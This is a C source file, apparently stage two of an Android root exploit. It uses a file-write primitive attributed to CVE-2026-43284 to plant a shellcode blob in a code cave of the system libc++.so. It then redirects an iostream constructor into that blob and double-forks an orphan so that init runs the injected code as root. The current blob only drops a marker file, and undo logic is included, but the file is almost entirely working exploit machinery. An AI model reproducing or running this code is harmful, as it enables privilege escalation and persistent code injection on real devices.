/*
 * DFvivo stage-2 — libc++ hook (port of DFRoot exp.c/elf_parser.c, GPL-2.0).
 *
 * CVE-2026-43284 write path is the stage-1 machinery (probe.c). Stage-2 uses
 * it to (1) paste the hook blob into libc++.so's end-of-.text page slack and
 * (2) swap the first instruction of the hooked function for a branch into the
 * blob. The app then double-forks an orphan; when init reaps it, init's main
 * thread calls through the hooked function and the blob runs with uid 0/tid 1.
 *
 * Phase-1 blob (libcxx.S here) only creates /dev/dfd as one-shot evidence.
 */
#include <errno.h>
#include <fcntl.h>
#include <linux/elf.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define DF_LIBCXX   "/system/lib64/libc++.so"
#define DF_HOOK_SYM "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_"
#define DF_MARKER   "/dev/dfd"

/* blob image global labels (libcxx.S) */
extern char     libcxx_data[];
extern char     libcxx_start[];
extern uint32_t libcxx_len;
extern char     libcxx_first_inst_copy[];

/* stage-1 primitives (probe.c) — set up once main parsed the common args */
extern uint32_t g_spi;
int             patch_file_cbc(const char *path, const char *payload,
                               size_t len, size_t foff, int use_helper);

static const char *g_lib   = DF_LIBCXX;
static const char *g_sym   = DF_HOOK_SYM;
static const char *g_state = NULL;

struct PatchRestore {
    const char *lib;
    uint64_t    shell_off;
    uint32_t    shell_padded;
    uint64_t    tramp_aligned;
    int         valid;
    uint8_t     tramp_orig[16];
    uint8_t     shell_orig[8192];
};
static struct PatchRestore g_restore;

/* ---- state file: lets an unpatch run in a *new* process undo a patch ---- */
#define DF_STATE_MAGIC 0x46564432u /* "D2VF" */

static void save_state(const char *path, const struct PatchRestore *r) {
    FILE *f = fopen(path, "wb");
    if (!f) { printf("hook: state save failed: %s\n", strerror(errno)); return; }
    uint32_t magic = DF_STATE_MAGIC;
    fwrite(&magic, 4, 1, f);
    fwrite(r, sizeof(*r), 1, f);
    fclose(f);
    printf("hook: state saved %s\n", path);
}

static int load_state(const char *path, struct PatchRestore *r) {
    FILE *f = fopen(path, "rb");
    if (!f) return 1;
    uint32_t magic = 0;
    if (fread(&magic, 4, 1, f) != 1 || magic != DF_STATE_MAGIC) { fclose(f); return 1; }
    int ok = fread(r, sizeof(*r), 1, f) == 1;
    fclose(f);
    if (!ok) return 1;
    r->lib = DF_LIBCXX; /* pointer doesn't survive disk round-trip */
    return 0;
}

static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}

/* DFRoot find_code_cave: tail-of-segment slack first, then any zero run big
 * enough within the exec PT_LOAD. */
static int find_code_cave(int fd, uint64_t exec_off, uint64_t exec_filesz,
                          uint64_t tail_off, size_t shellcode_size,
                          uint64_t *out_off) {
    long     pagesize = sysconf(_SC_PAGESIZE);
    uint64_t page_off = tail_off & ((uint64_t)pagesize - 1);
    uint64_t slack    = page_off ? (uint64_t)pagesize - page_off : 0;
    if (shellcode_size <= slack) { *out_off = tail_off; return 0; }

    printf("hook: shellcode %zu > tail slack %llu — scanning\n",
           shellcode_size, (unsigned long long)slack);
    if (lseek64(fd, exec_off, SEEK_SET) < 0) return 1;
    uint64_t run_start = 0, run_len = 0, max_run_len = 0;
    char page[4096];
    for (uint64_t done = 0; done < exec_filesz; done += sizeof(page)) {
        size_t chunk = exec_filesz - done;
        if (chunk > sizeof(page)) chunk = sizeof(page);
        ssize_t n = read(fd, page, chunk);
        if (n <= 0) break;
        for (ssize_t i = 0; i < n; i++) {
            if (page[i] == 0) {
                if (!run_len) run_start = exec_off + done + (uint64_t)i;
                if (++run_len >= shellcode_size) {
                    printf("hook: cave at 0x%llx\n", (unsigned long long)run_start);
                    *out_off = run_start;
                    return 0;
                }
                if (run_len > max_run_len) max_run_len = run_len;
            } else {
                run_len = 0;
            }
        }
    }
    printf("hook: no cave >= %zu (max %llu)\n",
           shellcode_size, (unsigned long long)max_run_len);
    return 1;
}

/* DFRoot find_hook_target: symbol st_value -> file offset, shell placement,
 * first 4 bytes currently at the hook site. */
static int find_hook_target(const char *lib, const char *symname,
                            uint64_t *hook_target, uint64_t *payload_target,
                            uint32_t *first_instruction, size_t shellcode_size) {
    *hook_target    = 0;
    *payload_target = 0;

    int fd = open(lib, O_RDONLY);
    if (fd < 0) { printf("hook: open %s: %s\n", lib, strerror(errno)); return 1; }

    Elf64_Ehdr hdr;
    if (read(fd, (char *)&hdr, sizeof(hdr)) < (ssize_t)sizeof(hdr)) {
        printf("hook: read ehdr: %s\n", strerror(errno));
        close(fd); return 1;
    }
    if (memcmp(hdr.e_ident, "\x7f""ELF", 4) != 0) { printf("hook: bad ELF\n"); close(fd); return 1; }
    if (hdr.e_phentsize != sizeof(Elf64_Phdr))    { printf("hook: bad phentsize\n"); close(fd); return 1; }

    uint64_t exec_off = 0, exec_filesz = 0, exec_vaddr = 0;
    if (lseek64(fd, hdr.e_phoff, SEEK_SET) < 0) { close(fd); return 1; }
    for (int i = 0; i < hdr.e_phnum; i++) {
        Elf64_Phdr phdr;
        if (read(fd, (char *)&phdr, sizeof(phdr)) != (ssize_t)sizeof(phdr)) {
            printf("hook: read phdr[%d]: %s\n", i, strerror(errno)); close(fd); return 1;
        }
        if (phdr.p_type == PT_LOAD && (phdr.p_flags & PF_X)) {
            *payload_target = phdr.p_offset + phdr.p_filesz;
            exec_off        = phdr.p_offset;
            exec_filesz     = phdr.p_filesz;
            exec_vaddr      = phdr.p_vaddr;
            break;
        }
    }
    if (!exec_off && !exec_vaddr) { printf("hook: no exec PT_LOAD\n"); close(fd); return 1; }

    if (lseek64(fd, hdr.e_shoff + hdr.e_shstrndx * sizeof(Elf64_Shdr), SEEK_SET) < 0) {
        printf("hook: seek shstrndx: %s\n", strerror(errno)); close(fd); return 1;
    }
    Elf64_Shdr str_shdr;
    if (read(fd, (char *)&str_shdr, sizeof(str_shdr)) != (ssize_t)sizeof(str_shdr)) {
        close(fd); return 1;
    }

    uint64_t dynstr = 0, dynsym_off = 0, dynsym_size = 0;
    for (int i = 0; i < hdr.e_shnum; i++) {
        Elf64_Shdr shdr;
        if (lseek64(fd, hdr.e_shoff + i * sizeof(Elf64_Shdr), SEEK_SET) < 0) { close(fd); return 1; }
        if (read(fd, (char *)&shdr, sizeof(shdr)) != (ssize_t)sizeof(shdr))  { close(fd); return 1; }
        if (lseek64(fd, shdr.sh_name + str_shdr.sh_offset, SEEK_SET) < 0)    { close(fd); return 1; }
        char name[64];
        if (read(fd, name, sizeof(name) - 1) != sizeof(name) - 1) { close(fd); return 1; }
        name[sizeof(name) - 1] = 0;
        if (!strcmp(name, ".dynstr")) dynstr = shdr.sh_offset;
        if (!strcmp(name, ".dynsym")) { dynsym_off = shdr.sh_offset; dynsym_size = shdr.sh_size; }
    }
    if (!dynstr || !dynsym_off) { printf("hook: no dynstr/dynsym\n"); close(fd); return 1; }

    for (int i = 0; i < (int)(dynsym_size / sizeof(Elf64_Sym)); i++) {
        Elf64_Sym sym;
        if (lseek64(fd, dynsym_off + i * sizeof(Elf64_Sym), SEEK_SET) < 0) { close(fd); return 1; }
        if (read(fd, (char *)&sym, sizeof(sym)) != (ssize_t)sizeof(sym))   { close(fd); return 1; }
        if (lseek64(fd, dynstr + sym.st_name, SEEK_SET) < 0)               { close(fd); return 1; }
        char name[200];
        if (read(fd, name, sizeof(name) - 1) != sizeof(name) - 1) { close(fd); return 1; }
        name[sizeof(name) - 1] = 0;
        if (!strcmp(name, symname)) {
            *hook_target = sym.st_value - exec_vaddr + exec_off;
            break;
        }
    }
    if (!*hook_target) { printf("hook: symbol %s not found\n", symname); close(fd); return 1; }

    if (find_code_cave(fd, exec_off, exec_filesz, *payload_target, shellcode_size, payload_target)) {
        close(fd); return 1;
    }
    if (pread(fd, first_instruction, 4, *hook_target) != 4) {
        printf("hook: pread first_insn: %s\n", strerror(errno)); close(fd); return 1;
    }
    close(fd);
    return 0;
}

/* DFRoot patch_hook. Blob layout (libcxx.S) matches DFRoot's byte-for-byte:
 *   libcxx_data | code... | libcxx_first_inst_copy (8 B: insn + b end) |
 *   end (4 B)   | libcxx_end                                            */
static int patch_hook(struct PatchRestore *restore) {
    const uint32_t BRANCH = 0x14000000;
    char *stage_data      = libcxx_data;
    uint32_t stage_len    = libcxx_len;
    char *stage_start     = libcxx_start;
    char *first_inst_copy = libcxx_first_inst_copy;
    uint32_t start_delta  = (uint32_t)(stage_start - stage_data);

    size_t padded;
    char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) { printf("hook: pad16 alloc failed\n"); return -1; }
    if (padded > sizeof(restore->shell_orig)) {
        printf("hook: blob too large (%zu)\n", padded); free(buf); return -1;
    }

    uint64_t hook_off = 0, shell_off = 0;
    uint32_t first_insn = 0;
    if (find_hook_target(restore->lib, g_sym, &hook_off, &shell_off, &first_insn, padded)) {
        free(buf); return 1;
    }
    printf("hook: hook=0x%llx shell=0x%llx blob=%u first=0x%08x\n",
           (unsigned long long)hook_off, (unsigned long long)shell_off,
           stage_len, first_insn);

    uint32_t hook_insn = BRANCH |
        (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);

    if (first_insn == hook_insn) { printf("hook: already patched\n"); free(buf); return 0; }

    uint32_t jmpback = BRANCH |
        ((((hook_off + 4) - (shell_off + stage_len - 4)) >> 2) & 0x3ffffff);
    *(uint32_t *)&buf[stage_len - 4]                = jmpback;
    *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;

    uint64_t aligned = hook_off & ~(uint64_t)15;
    int fd = open(restore->lib, O_RDONLY);
    if (fd < 0) { printf("hook: open: %s\n", strerror(errno)); free(buf); return -1; }
    int ok = pread(fd, restore->shell_orig, padded, (off_t)shell_off) == (ssize_t)padded
           && pread(fd, restore->tramp_orig, 16, (off_t)aligned) == 16;
    close(fd);
    if (!ok) { printf("hook: pread originals failed\n"); free(buf); return -1; }

    restore->shell_off     = shell_off;
    restore->shell_padded  = (uint32_t)padded;
    restore->tramp_aligned = aligned;
    restore->valid         = 1;

    printf("hook: patch blob (%zu B) at 0x%llx\n", padded, (unsigned long long)shell_off);
    int ret = patch_file_cbc(restore->lib, buf, padded, shell_off, 0);
    free(buf);
    if (ret) { printf("hook: blob patch failed: %d\n", ret); return ret; }

    printf("hook: patch trampoline at 0x%llx\n", (unsigned long long)aligned);
    uint32_t pos = (uint32_t)(hook_off & 15);
    uint8_t blk[16];
    memcpy(blk, restore->tramp_orig, 16);
    memcpy(&blk[pos], &hook_insn, 4);
    int tramp_ret = patch_file_cbc(restore->lib, (char *)blk, 16, (size_t)aligned, 0);
    if (tramp_ret) { printf("hook: trampoline patch failed: %d\n", tramp_ret); return tramp_ret; }

    if (g_state) save_state(g_state, restore);
    return 0;
}

/* DFRoot createOrphanProcess: double-fork; grandchild sleeps, exits, is
 * adopted by init; init's main thread runs our hooked function on reap. */
static int createOrphanProcess(void) {
    printf("hook: trigger (orphan)\n");
    fflush(stdout); fflush(stderr);
    int pid = fork();
    if (pid < 0) { printf("hook: fork: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { sleep(1); _exit(0); }
        _exit(0);
    }
    while (waitpid(pid, NULL, 0) < 0 && errno == EINTR)
        ;
    return 0;
}

static int status_print(void) {
    size_t padded = ((size_t)libcxx_len + 15) & ~(size_t)15;
    uint64_t hook_off = 0, shell_off = 0;
    uint32_t first_insn = 0;
    if (find_hook_target(g_lib, g_sym, &hook_off, &shell_off, &first_insn, padded)) return 1;
    const uint32_t BRANCH = 0x14000000;
    uint32_t hook_insn = BRANCH |
        (((shell_off + (uint32_t)(libcxx_start - libcxx_data) - hook_off) >> 2) & 0x3ffffff);
    printf("hook: status lib=%s len=%u hook=0x%llx shell=0x%llx first=0x%08x%s\n",
           g_lib, libcxx_len, (unsigned long long)hook_off,
           (unsigned long long)shell_off, first_insn,
           first_insn == hook_insn ? "  [PATCHED]" : "  [clean]");
    if (padded > shell_off) printf("hook: WARNING shell region overlaps file end\n");
    return 0;
}

int hook_main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);

    const char *mode = NULL;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--hook-mode") && i + 1 < argc)    mode = argv[++i];
        else if (!strcmp(argv[i], "--hook-lib") && i + 1 < argc)   g_lib = argv[++i];
        else if (!strcmp(argv[i], "--hook-sym") && i + 1 < argc)   g_sym = argv[++i];
        else if (!strcmp(argv[i], "--hook-state") && i + 1 < argc) g_state = argv[++i];
    }
    if (!mode) { printf("hook: no --hook-mode\n"); return 2; }

    if (!strcmp(mode, "status")) return status_print();

    if (!strcmp(mode, "patch")) {
        int rc = patch_hook(&g_restore);
        return rc ? 1 : 0;
    }

    if (!strcmp(mode, "unpatch")) {
        if (g_restore.valid) {
            int a = patch_file_cbc(g_restore.lib, (char *)g_restore.shell_orig,
                                   g_restore.shell_padded, g_restore.shell_off, 0);
            int b = patch_file_cbc(g_restore.lib, (char *)g_restore.tramp_orig,
                                   16, g_restore.tramp_aligned, 0);
            if (a || b) { printf("hook: unpatch(warm) FAILED\n"); return 1; }
            printf("hook: unpatch(warm) complete\n");
            return 0;
        }
        struct PatchRestore st;
        if (g_state && !load_state(g_state, &st) && st.valid) {
            int a = patch_file_cbc(st.lib, (char *)st.shell_orig,
                                   st.shell_padded, st.shell_off, 0);
            int b = patch_file_cbc(st.lib, (char *)st.tramp_orig,
                                   16, st.tramp_aligned, 0);
            if (a || b) { printf("hook: unpatch(disk) FAILED\n"); return 1; }
            printf("hook: unpatch(disk) complete\n");
            return 0;
        }
        printf("hook: unpatch: no state (warm or disk)\n");
        return 1;
    }

    if (!strcmp(mode, "trigger")) return createOrphanProcess();

    if (!strcmp(mode, "full")) {
        struct stat pre;
        int pre_existed = (stat(DF_MARKER, &pre) == 0);
        if (pre_existed)
            printf("hook: marker pre-exists (mtime=%ld) — final mtime tells fresh vs stale\n",
                   (long)pre.st_mtime);
        int rc = patch_hook(&g_restore);
        if (rc) { printf("hook: FULL patch failed rc=%d\n", rc); return 1; }
        createOrphanProcess();
        printf("hook: waiting 2500 ms for init reap\n");
        usleep(2500000);
        struct stat st;
        if (stat(DF_MARKER, &st) == 0) {
            printf("RESULT: HOOK FIRED%s — marker %s mtime=%ld now=%ld uid=%u mode=%o\n",
                   pre_existed ? " (!! pre-existing)" : "",
                   DF_MARKER, (long)st.st_mtime, (long)time(NULL),
                   (unsigned)st.st_uid, (unsigned)(st.st_mode & 07777));
            return 0;
        }
        printf("RESULT: NO MARKER (%s) — blob path not reached; errno=%d (%s)\n",
               DF_MARKER, errno, strerror(errno));
        return 1;
    }

    printf("hook: unknown mode %s\n", mode);
    return 2;
}
